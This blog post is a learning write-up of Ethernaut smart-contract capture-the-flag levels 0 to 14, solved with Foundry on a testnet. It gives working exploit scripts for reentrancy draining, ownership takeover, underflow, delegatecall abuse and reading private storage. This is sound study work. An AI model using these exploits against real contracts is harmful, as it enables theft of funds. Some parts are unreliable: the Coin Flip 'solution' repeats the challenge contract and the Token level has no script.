---
layout: post
title:  "Ethernaut CTF (Blockchain)"
command: cat ethernaut
---

Hello internet, I am learning web3 security by doing blockchain CTF challenges. To get to know more common vulnerabilities and put my learning knowledge from secureum bootcamp in practice I have solved <a href="https://ethernaut.openzeppelin.com/" target=_blank>ethernaut</a> CTF challenges powered by OpenZeppelin. I have solved all these challenges by using foundry to get my hands dirty with foundry. I recommend to go through the ethereum101, solidity 101 and solidity 201 modules of the secureum bootcamp before taking up these challenges.

This repository can be useful as a template for the people who want's to solve ethernaut by using foundry. I will try my best to explain the solutions to challenges.


> Solution Repo : <a href="https://github.com/TheMj0ln1r/ethernaut-foundry" target=_blank>https://github.com/TheMj0ln1r/ethernaut-foundry</a>

Setup the codebase locally :

```bash
$ git clone https://github.com/TheMj0ln1r/ethernaut-foundry.git
$ cd ethernaut-foundry
```

The challenge contracts are in `/src`

Solution scripts under `/script`

You need to add a `.env` file and fill following required fieds.

```text
RPC_URL=
MY_ADDRESS=
PRIVATE_KEY=
```

Get some Sepolia Eth to your address. (I am using Sepolia Testnet to solve)


# 0 Hello Ethernaut

This is a sanity check challenge to the ethernaut. The source code was given to us. We have to deploy the instance and call the `info()` method on it and follow the instructions to solve the challenge.

`level0.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Instance {

  string public password;
  uint8 public infoNum = 42;
  string public theMethodName = 'The method name is method7123949.';
  bool private cleared = false;

  // constructor
  constructor(string memory _password) public {
    password = _password;
  }

  function info() public pure returns (string memory) {
    return 'You will find what you need in info1().';
  }

  function info1() public pure returns (string memory) {
    return 'Try info2(), but with "hello" as a parameter.';
  }

  function info2(string memory param) public pure returns (string memory) {
    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked('hello'))) {
      return 'The property infoNum holds the number of the next info method to call.';
    }
    return 'Wrong parameter.';
  }

  function info42() public pure returns (string memory) {
    return 'theMethodName is the name of the next method.';
  }

  function method7123949() public pure returns (string memory) {
    return 'If you know the password, submit it to authenticate().';
  }

  function authenticate(string memory passkey) public {
    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {
      cleared = true;
    }
  }

  function getCleared() public view returns (bool) {
    return cleared;
  }
}

```

`level0Solve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import {Instance} from "src/level0.sol";

contract Level0Solve is Script{
    Instance public Level0 = Instance(0xc770F44bFDAe8eD857FaBeaFF5A702B87eAeC331);
    function run() external{
        string memory password = Level0.password();
        console.log("Password : ", password);
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Level0.authenticate(password);
        vm.stopBroadcast();
    }
}
```

To run script : 

```bash
$ source .env
$ forge script script/level0Solve.s.sol:Level0Solve --rpc-url $RPC_URL --broadcast
```

# 1 Fallback

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

- Goal : 

1. Our goal is to become the owner of the contract and drain all the ether of it

- Solution : 

1. Fallback contract sets the owner variable in `receive()` function.
2. To set the owner we need to pass the require check in `receive()`
3. To pass the check we have to send some ether with the `TX` and our sender should have some contributions in it.
4. So, Initially we will send contributions and then send some ether to the contract to invoke the `receive()` method.
5. After we sent the new owner as ourselves, we can call `withdraw()` function to drain the contract.

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import {Fallback} from "src/Fallback.sol";

contract Level0Solve is Script{
    Fallback public level1 = Fallback(payable(0x67B71283A3a53C445f33Ea0a0F8E435cD1f283E1));
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Original Owner : ", level1.owner());        
        
        level1.contribute{value: 0.0001 ether}();
        address(level1).call{value: 1 wei}("");

        console.log("New Owner : ", level1.owner());
        console.log("Initial Balance : ", address(level1).balance);
        level1.withdraw();
        console.log("Final Balance : ", address(level1).balance);
        vm.stopBroadcast();
    }
}
```

To run script : 

```bash
$ source .env
$ forge script script/FallbackSolve.s.sol:FallbackSolve --rpc-url $RPC_URL --broadcast
```

# 2 Fallout

`Fallout.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin-contracts-06/contracts/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

- Goal : 

1. Claim the ownership of the contract

- Solution

1. In solidity `0.6.0` the constructor of the contract is the name of the contract, later it was replaced with `constructor` keyword.
2. Here in this contract the constructor sets up the `owner`. 
3. But the function `Fal1out()` is not actually a constructor, because its not same as the contract name.
4. So, we can call this function and claim the ownership.

`FalloutSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutSolve is Script{
    Fallout public level2 = Fallout(0xf66ffe7e1e2663E19fec83F39256cc3Af3513000);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Original Owner : ", level2.owner());
        level2.Fal1out();
        console.log("New Owner : ", level2.owner());
        level2.collectAllocations();

        vm.stopBroadcast();
    }
}

```

To run script : 

```bash
$ source .env
$ forge script script/FalloutSolve.s.sol:FalloutSolve --rpc-url $RPC_URL --broadcast
```

# 3 Coin Flip

`CoinFlip.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

- Goal :

1. We have to make the `consecutiveWins` to 10. We need to guess the coin flip consecutives 10 times. 

- Solution : 

1. We can implement the same logic which is used to find the `side` of the coin in the `CoinFlip` contract.
2. Write a new Attack contract which will perform the `flip()` calculation and sends the value to the `CoinFlip` contract.
3. Since the entire computaion at both contracts happens in same transaction, the `block.hash` and `block.number` remains same the both contracts. 
4. But we need to run the Attack script 10 times with a small amount of time delay. Because the last blockhash should not be equal to the current blockhash. So, running script at different times will change the block of the transaction.

`CoinFlipSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

To run script : 

```bash
$ source .env
$ forge script script/CoinFlipSolve.s.sol:CoinFlipSolve --rpc-url $RPC_URL --broadcast
```

# 4 Telephone

`Telephone.sol`

```javascript

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

- Goal 

1. Claim the ownership of the Telephone contract

- Solution

1. Simply call the `changeOwner()` function from a contract.
2. If the `msg.sender` is equals to `tx.origin` which means the call was from a EOA. If its not, then the call is from a contract.
3. EOA is the address which originates any transation in the ethereum.
4. So, we have to call the `changeOwner()` from an Attack contract.

`TelephoneSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Telephone} from "../src/Telephone.sol";

contract TelephoneSolve is Script{
    Telephone public telephone = Telephone(0xbB45D0C7AC29151e0309338a63a7fFEffA348585);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Original Owner : ", telephone.owner());

        Attack attack = new Attack(telephone);
        console.log("Attack Address : ", address(attack));

        console.log("New Owner : ", telephone.owner());
        vm.stopBroadcast();
    }
}

contract Attack{
    Telephone public telephone;
    constructor(Telephone _telephone){
        telephone = _telephone;
        telephone.changeOwner(0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602);
    }
}
```

To run script : 

```bash
$ source .env
$ forge script script/TelephoneSolve.s.sol:TelephoneSolve --rpc-url $RPC_URL --broadcast
```

# 5 Token

`Token.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

- Goal

1. We have initial token balance of 20, we need to get ourself more tokens.

Solution : 

1. This contract uses solidity pragma `0.6.0`, in which no arithmetic overflow/underflow checks are not performed by default.
2. In `transfer()` function the require check can be bypassed when we pass value as more than 20.
3. 20 - 21 = -1 which results in `2**256 - 1`. Which is `>= 0` and the same will happens in the update of balance at sender.
4. `balances[msg.sender] -= _value;` will become balance[msg.sender] = 20 - 21 = 2**256 - 1.
5. A huge amount of tokens to our account.

To run script : 

```bash
$ source .env
$ forge script script/TokenSolve.s.sol:TokenSolve --rpc-url $RPC_URL --broadcast
```

# 6 Delegation

`Delegation.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

- Goal 

1. Claim ownership of Delegation contract

- Solution

1. `Delegation` contracts uses delegatecall to call the other contract `Delegate`.
2. One thing to remember with delegatecall is that it will maintain the `msg.sender` and `msg.value` when it calls other contract.
3. And also it updates the caller contract storage not the contract which being called.
4. So, when we call `pwn()` on the Delegation address it will forward the call to Delegate contract and updates the owner variable in Delegation contract.

`DelegationSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Delegation.sol";


contract DelegationSolve is Script{
    Delegation public delegation = Delegation(0xFb9BeF4E9A8d68C2Bc2c4D2dE5688fbe0e8224F2);
    function run() external{
        vm.startBroadcast();
        console.log("Initial Owner : ", delegation.owner());
        
        address(delegation).call(abi.encodeWithSignature("pwn()"));

        console.log("Final Owner : ", delegation.owner());
        
        vm.stopBroadcast();
    }
}
```

To run script : 

```bash
$ source .env
$ forge script script/DelegationSolve.s.sol:DelegationSolve --rpc-url $RPC_URL --broadcast
```

# 7 Force

`Force.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

- Goal

1. We need to make the balance of the Force contract more than 0.

- Solution

1. There is no `receive()/fallback()` function and no payable functions in the Force contract.
2. If we send any ether to this contract it will be reverted.
3. There are more ways to receive ether not just `receive()/fallback()`.
4. Ether can be received via coinbase transaction, i.e a mining reward.
5. Also when someone called selfdestruct on any contract and mentioned our address in the recepient of the ether after selftdestruct.
6. So, we can deploy a contract with some ether and implement a selfdestruct function and pass the recepient as the `Force` contract address.
7. Upon selfdestruct of the Attack contract it Force contract will receive ether.

`ForceSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Force} from "../src/Force.sol";

contract ForceSolve is Script {
    Force public force = Force(0xef1ec80b578969a99B840745178d655f3594Db99);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("balance of Force : ", address(force).balance);
        new Attack{value: 100 wei}().exploit(payable(address(force)));
        console.log("balance of Force : ", address(force).balance);
        vm.stopBroadcast();
    }
}

contract Attack{
    address public owner;
    constructor() payable {
        owner = msg.sender;
    }
    function exploit(address payable _fundReceiver) public {
        require(msg.sender == owner);
        selfdestruct(_fundReceiver);
    }

}
```

To run script : 

```bash
$ source .env
$ forge script script/ForceSolve.s.sol:ForceSolve --rpc-url $RPC_URL --broadcast
```

# 8 Vault

`Vault.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

- Goal 

1. We need to unlock the vault.

- Solution

1. We can simply call the `unlock()` function with password. But the password was not publicly accessible. 
2. Declaring a variable `private` doesn't mean that no one can read that variable. Only the other contracts which interacts with it won't able to view that variable.
3. Anyone from off-chain can easily query that value. We see that password is stored in storage slot 1.
4. We can use foundry cheatcode `vm.load` to read password and call the `unlock()` to unlock the vault.

`VaultSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Vault} from "../src/Vault.sol";

contract VaultSolve is Script {
    Vault public vault = Vault(0x80C30D2FE8e45F588d70bc5D530939c7f1b22f94);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Vault locked : ", vault.locked());
        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
        console.logBytes32(password);
        vault.unlock(password);

        console.log("Vault locked : ", vault.locked());
        vm.stopBroadcast();
    }
}
```

To run script : 

```bash
$ source .env
$ forge script script/VaultSolve.s.sol:VaultSolve --rpc-url $RPC_URL --broadcast
```

# 9 King

`King.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

```

- Goal

1. Be the `King` and make others dont claim the `King` position again.

- Solution

1. Initially check the `prize` amount that need to send to be the king. And send the `prize` amount to the `King` contract.
2. When someone send the `prize` amount back to us to claim the king position, we can deny the money.
3. So, that they wont be the king anymore.
4. In order to deny the prize, we can write a contract which sends prize to the king contract and dont implement any `receive()/fallback()` function.
5. This will revert others transaction when they sends prize to us, So, we will remain as the king.

`KingSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {King} from "../src/King.sol";

contract KingSolve is Script {
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        King king = King(payable(0xCF1EE241C905C39Add26C82d4a2CCcBC6D070fC2));
        uint _prize = king.prize();
        console.log("Current King : ", king._king());
        console.log("Current Prize : ",_prize);

        new Attack().exploit{value: _prize}();
        console.log("Final King : ", king._king());
        vm.stopBroadcast();
    }
}

contract Attack{
    King public king = King(payable(0xCF1EE241C905C39Add26C82d4a2CCcBC6D070fC2));

    function exploit() public payable{
        address(king).call{value : msg.value}("");
    }

}
```

To run script : 

```bash
$ source .env
$ forge script script/KingSolve.s.sol:KingSolve --rpc-url $RPC_URL --broadcast
```

# 10 Reentrancy

`Reentrancy.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

- Goal 

1. Drain all the ether of the Reentrance contract

- Solution

1. The `withdraw()` function is vulnerable to `Reentrancy`, as it is updating the user balance after the external call.
2. One could deposit some ether to pass the require check in withdraw and and call the withdraw from a contract in which a fallback function is implemented in such a way that it is re entered into withdraw again.
3. So, we will donate some ether to the contract and then call withdraw from a contract.
4. The withdraw call send our ether back and invokes the fallback or receive function of our contract.
5. We can call the `withdraw()` function again from the fallback function to reenter again into `Reentrance` contract.
6. Still we can manage to pass require check as our balance wasn't updated yet. 
7. We need to check the balance of the `Reentrance` contract before reentering because when we call the withdraw again after the balance of `Reentrance` becomes zero will revert the entire transaction.


`ReentrancySolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Reentrance} from "../src/Reentrancy.sol";

contract ReentrancySolve is Script{
    Reentrance public reentrance = Reentrance(0xD063dA7e4876694Cf31a23c7bb61e38184FD5B02);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Initial Balance : ", address(reentrance).balance);

        new Attack().exploit{value: 0.001 ether}();

        console.log("Final Balance : ", address(reentrance).balance);
        vm.stopBroadcast();
    }
}

contract Attack{
    Reentrance public reentrance = Reentrance(0xD063dA7e4876694Cf31a23c7bb61e38184FD5B02);

    function exploit() public payable{
        reentrance.donate{value: 0.001 ether}(address(this));
        reentrance.withdraw(0.001 ether);

        // I need my sepolia back
        msg.sender.call{value : address(this).balance}("");
    }

    receive() payable external{
        if (address(reentrance).balance >= 0.001 ether){
            reentrance.withdraw(0.001 ether);
        }
    }
}

```

To run script : 

```bash
$ source .env
$ forge script script/ReentrancySolve.s.sol:ReentrancySolve --rpc-url $RPC_URL --broadcast
```

# 11 Elevator

`Elevator.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

- Goal

1. We need to get to the top floor, i.e make the top boolean to `true`

- Solution

1. The Elevator calling the `isLastFloor()` function on `msg.sender` which is insecure. Dont trust the unknown libraries or contract while making the calls.
2. The `top` variable is being updated upon the return value of the `isLastFloor()` function. 
3. But, To pass the `if` condition the `isLastFloor()` should return the `false`. But the `top` will become `false` only if it results false everytime.
4. We can observe that the `isLastFloor()` function is being called twice. So, we can write a contract which implements `isLastFloor()` function is such a way that is returns `false` on first call and `true` on second call.
5. So, that the `if` condition satifsies and `top` will be updated to true.


`ElevatorSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Elevator} from "../src/Elevator.sol";

contract ElevatorSolve is Script{
    Elevator public elevator = Elevator(0xa32a12f573871eE4C1B6d2E9B8BA424d4cD01718);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Top : ", elevator.top());

        new Attack().exploit();

        console.log("Top : ", elevator.top());
        vm.stopBroadcast();
    }
}

contract Attack{
    Elevator public elevator = Elevator(0xa32a12f573871eE4C1B6d2E9B8BA424d4cD01718);
    uint public callCount;
    function exploit() public payable{
        elevator.goTo(10);
    }

    function isLastFloor(uint) external returns (bool){
        callCount += 1;
        if(callCount == 1){
            return false;
        }
        return true;
    }

}
```


To run script : 

```bash
$ source .env
$ forge script script/ElevatorSolve.s.sol:ElevatorSolve --rpc-url $RPC_URL --broadcast
```

# 12 Privacy

`Privacy.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}

```

- Goal 

1. We need to unlock the contract, i.e call `unlock()` function with right password.

- Solution

1. This challenge is similar to `Vault`. But we need to understand the storage layout of this contract and query the exact passwor storage slot of the contract.
2. The storage layout of contract as follows : 
  ```
bool public locked = true;                      // slot 0
uint256 public ID = block.timestamp;             // slot 1
uint8 private flattening = 10;                   // slot 2
uint8 private denomination = 255;                // slot 2
uint16 private awkwardness = uint16(block.timestamp);  // slot 2
bytes32[3] private data;    // data[0] => slot 3  // data[1] => slot 4  // data[2] => slot 5
  ```
3. Password is the lower 16 bytes of the `data[2]`, i.e `require(_key == bytes16(data[2]));`
4. Since the `data[2]` stored at slot 5, we can query it with `vm.load` cheatcode.
5. Calling unlock with this password will solve the challenge.

`PrivacySolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Privacy} from "../src/Privacy.sol";

contract PrivacySolve is Script{
    Privacy public privacy = Privacy(0x97Fd86fBE6F968de018C7C15B9D2f2cb2Caa94b2);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes32 slot5 = vm.load(address(privacy), bytes32(uint256(5)));
        console.logBytes32(slot5);

        console.log("Locked : ", privacy.locked());


        privacy.unlock(bytes16(slot5));

        console.log("Locked : ", privacy.locked());

        vm.stopBroadcast();
    }
}
```

To run script : 

```bash
$ source .env
$ forge script script/PrivacySolve.s.sol:PrivacySolve --rpc-url $RPC_URL --broadcast
```

# 13 Gatekeeper One

`GatekeeperOne.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

- Goal 

1. Make it past the gatekeeper and register as an entrant to pass this level.

- Solution

1. We have to successfully call the `enter()` function, without being revert by modifier checks.
2. We need to pass three modifier checks. We can simply pass `gateOne()` by calling it from another contract.
3. To bypass `gateTwo()` we need to send exact `gas` that should result the modulo 8191 to zero. 
4. `gasLeft()` is a method which calculates the remaining gas after executing instructions before it invoked. 
5. We can pass the amount of gas to be transferred to the external call. But we need to send exact amount of gas.
6. One thing that we can do is bruteforce. By randomly bruteforcing with different values of gas, we can pass this modifier check.
7. To pass the `gateThree()` we need to some calculations. It takes the `_gateKey` a bytes8 value as argument.
8. Lets calculate from last check.
```
uint16 third = uint16(uint160(tx.origin));
uint32 two = uint32(third);
bytes8 one = bytes8(abi.encodePacked(uint32(0xdeadbeef),two));
```
9. The modifiers checks the lower 32 bits of the gatekey after converting to uint64.
10. So, we can calculate the lower 16 bits of the `tx.orgin` and pad it with zeros to pass the gatThree and gateOne.
11. Two pass the gateTwo we can add random bits to the MSB position.


`GatekeeperSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";

contract GatekeeperOneSolve is Script{
    GatekeeperOne public gateOne = GatekeeperOne(0x4742252E47788a20b2C78a1343DEE68EC8De3804);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Entrant : ", address(gateOne.entrant()));

        new Attack().exploit();

        console.log("Entrant : ", address(gateOne.entrant()));
        vm.stopBroadcast();
    }
}

contract Attack{
    GatekeeperOne public gateOne = GatekeeperOne(0x4742252E47788a20b2C78a1343DEE68EC8De3804);

    function exploit() public {

        // uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
        // uint32(uint64(_gateKey)) != uint64(_gateKey)
        // uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))

        uint16 third = uint16(uint160(tx.origin));
        uint32 two = uint32(third);
        bytes8 one = bytes8(abi.encodePacked(uint32(0xdeadbeef),two));

        bytes8 _gateKey = one;
        for (uint i = 0; i<=500; i++){
            (bool success, ) = address(gateOne).call{gas : (8191 * 4)+i}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
        }
    }
}
```

To run script : 

```bash
$ source .env
$ forge script script/GatekeeperOneSolve.s.sol:GatekeeperOneSolve --rpc-url $RPC_URL --broadcast
```

# 14 Gatekeeper Two

`GatekeeperTwo.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

- Goal

1. This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.

- Solution

1. Similiar to gatekeeper one, to pass `gateOne()` here wee need to call from a contract.
2. `gateTwo()` checks that the caller contract code should zero. You think its impossible? Not at all.
3. Yes, code inside contract constructor won't be stored on blockchain. So, we can call the `enter()` from our attack contract constructor.
4. To pass the `gateThree()` we need to simple XOR operation. To get the `gateKey()` we need to do `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))` XOR `type(uint64).max`

`GatekeeperTwoSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";

contract GatekeeperTwoSolve is Script{
    GatekeeperTwo public gateTwo = GatekeeperTwo(0x9C11F689500821ffE630e6CFea7aC45C7226040c);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Entrant : ", address(gateTwo.entrant()));

        new Attack();

        console.log("Entrant : ", address(gateTwo.entrant()));
        vm.stopBroadcast();
    }
}

contract Attack{
    
    // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
    constructor() {
        GatekeeperTwo gateTwo = GatekeeperTwo(0x9C11F689500821ffE630e6CFea7aC45C7226040c);
        uint64 max = type(uint64).max;
        uint64 hsh = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        bytes8 _gateKey = bytes8(max ^ hsh);

        require(gateTwo.enter(_gateKey));
    }
}
```

To run script : 

```bash
$ source .env
$ forge script script/GatekeeperTwoSolve.s.sol:GatekeeperTwoSolve --rpc-url $RPC_URL --broadcast
```

# 15 Naught Coin

`NaughtCoin.sol`

```javascript
